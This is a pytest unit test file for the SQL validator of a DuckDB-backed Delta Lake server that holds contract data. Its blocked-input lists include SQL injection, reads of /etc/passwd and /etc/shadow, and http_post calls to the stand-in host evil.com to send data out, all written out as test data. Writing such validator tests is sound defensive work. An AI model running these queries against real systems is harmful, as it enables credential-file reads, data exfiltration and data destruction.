"""Tests for the SQL validation layer in the Delta Lake server.

These are pure unit tests — no running server required.

Run:
    uv run pytest delta_store/tests/test_sql_validation.py -v
"""

import pytest

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from serve import _validate_sql


# ---------------------------------------------------------------------------
# Allowed queries (should return None)
# ---------------------------------------------------------------------------

ALLOWED = [
    "SELECT count(*) FROM zmluvy",
    "SELECT * FROM zmluvy WHERE id = 1",
    "select id, nazov_zmluvy from zmluvy limit 10",
    "WITH cte AS (SELECT * FROM zmluvy) SELECT * FROM cte",
    "SELECT z.id, rf.flag_type FROM zmluvy z JOIN red_flags rf ON z.id = rf.zmluva_id",
    "SELECT count(*) FROM zmluvy;",  # trailing semicolon OK
    "SELECT sum(suma) FROM zmluvy WHERE datum_zverejnenia >= '2026-01-01'",
    "SELECT dodavatel_ico, count(*) as cnt FROM zmluvy GROUP BY dodavatel_ico ORDER BY cnt DESC",
    "WITH flagged AS (SELECT zmluva_id FROM red_flags) SELECT * FROM zmluvy WHERE id IN (SELECT zmluva_id FROM flagged)",
]


@pytest.mark.parametrize("sql", ALLOWED, ids=range(len(ALLOWED)))
def test_allowed_queries(sql):
    assert _validate_sql(sql) is None


# ---------------------------------------------------------------------------
# Blocked: non-SELECT statements
# ---------------------------------------------------------------------------

NON_SELECT = [
    "INSERT INTO zmluvy VALUES (1, 'test')",
    "UPDATE zmluvy SET suma = 0",
    "DELETE FROM zmluvy",
    "DROP TABLE zmluvy",
    "CREATE TABLE evil (id int)",
    "ATTACH 'other.db' AS other",
    "PRAGMA version",
]


@pytest.mark.parametrize("sql", NON_SELECT, ids=range(len(NON_SELECT)))
def test_block_non_select(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: multi-statement injection
# ---------------------------------------------------------------------------

MULTI_STATEMENT = [
    "SELECT 1; DROP TABLE zmluvy",
    "SELECT 1; INSERT INTO zmluvy VALUES (1, 'x')",
    "SELECT 1; ATTACH 'evil.db' AS x",
]


@pytest.mark.parametrize("sql", MULTI_STATEMENT, ids=range(len(MULTI_STATEMENT)))
def test_block_multi_statement(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: DuckDB file I/O functions
# ---------------------------------------------------------------------------

FILE_IO = [
    "SELECT * FROM read_csv('/etc/passwd')",
    "SELECT * FROM read_csv_auto('/etc/passwd')",
    "SELECT * FROM read_parquet('/tmp/evil.parquet')",
    "SELECT * FROM read_json('/tmp/data.json')",
    "SELECT * FROM read_json_auto('/tmp/data.json')",
    "SELECT * FROM read_blob('/etc/shadow')",
    "SELECT * FROM read_text('/etc/hostname')",
    "SELECT * FROM read_ndjson('/tmp/lines.json')",
    "SELECT * FROM read_ndjson_auto('/tmp/lines.json')",
    "SELECT * FROM READ_CSV('/etc/passwd')",  # case insensitive
]


@pytest.mark.parametrize("sql", FILE_IO, ids=range(len(FILE_IO)))
def test_block_file_io(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: DuckDB scanner/write functions
# ---------------------------------------------------------------------------

SCANNERS = [
    "SELECT * FROM delta_scan('delta_store/tables/zmluvy')",
    "SELECT * FROM parquet_scan('file.parquet')",
    "SELECT * FROM parquet_metadata('file.parquet')",
    "SELECT * FROM parquet_schema('file.parquet')",
    "SELECT * FROM csv_scan('file.csv')",
    "SELECT * FROM json_scan('file.json')",
    "SELECT * FROM sqlite_scan('crz.db', 'zmluvy')",
    "SELECT * FROM postgres_scan('conn', 'public', 'table')",
    "SELECT * FROM mysql_scan('conn', 'db', 'table')",
    "SELECT * FROM sniff_csv('/tmp/file.csv')",
]


@pytest.mark.parametrize("sql", SCANNERS, ids=range(len(SCANNERS)))
def test_block_scanners(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: write/export
# ---------------------------------------------------------------------------

WRITE_EXPORT = [
    "SELECT write_csv(zmluvy, '/tmp/dump.csv')",
    "SELECT write_parquet(zmluvy, '/tmp/dump.parquet')",
]


@pytest.mark.parametrize("sql", WRITE_EXPORT, ids=range(len(WRITE_EXPORT)))
def test_block_write(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: extension/system manipulation
# ---------------------------------------------------------------------------

SYSTEM = [
    "SELECT install('httpfs')",
    "SELECT load('httpfs')",
    "SELECT getenv('HOME')",
    "SELECT current_setting('access_mode')",
]


@pytest.mark.parametrize("sql", SYSTEM, ids=range(len(SYSTEM)))
def test_block_system(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: filesystem enumeration
# ---------------------------------------------------------------------------

FILESYSTEM = [
    "SELECT * FROM glob('/tmp/*')",
    "SELECT * FROM list_files('/tmp')",
]


@pytest.mark.parametrize("sql", FILESYSTEM, ids=range(len(FILESYSTEM)))
def test_block_filesystem(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: network access
# ---------------------------------------------------------------------------

NETWORK = [
    "SELECT * FROM read_csv('https://evil.com/data.csv')",
    "SELECT http_get('https://evil.com')",
    "SELECT http_post('https://evil.com', 'data')",
]


@pytest.mark.parametrize("sql", NETWORK, ids=range(len(NETWORK)))
def test_block_network(sql):
    assert _validate_sql(sql) is not None


# ---------------------------------------------------------------------------
# Blocked: embedded in subqueries/CTEs
# ---------------------------------------------------------------------------

EMBEDDED = [
    "WITH x AS (SELECT * FROM read_csv('/etc/passwd')) SELECT * FROM x",
    "SELECT * FROM zmluvy WHERE id IN (SELECT 1 FROM read_parquet('/tmp/f.parquet'))",
    "SELECT (SELECT * FROM read_text('/etc/hostname'))",
]


@pytest.mark.parametrize("sql", EMBEDDED, ids=range(len(EMBEDDED)))
def test_block_embedded_in_subquery(sql):
    assert _validate_sql(sql) is not None
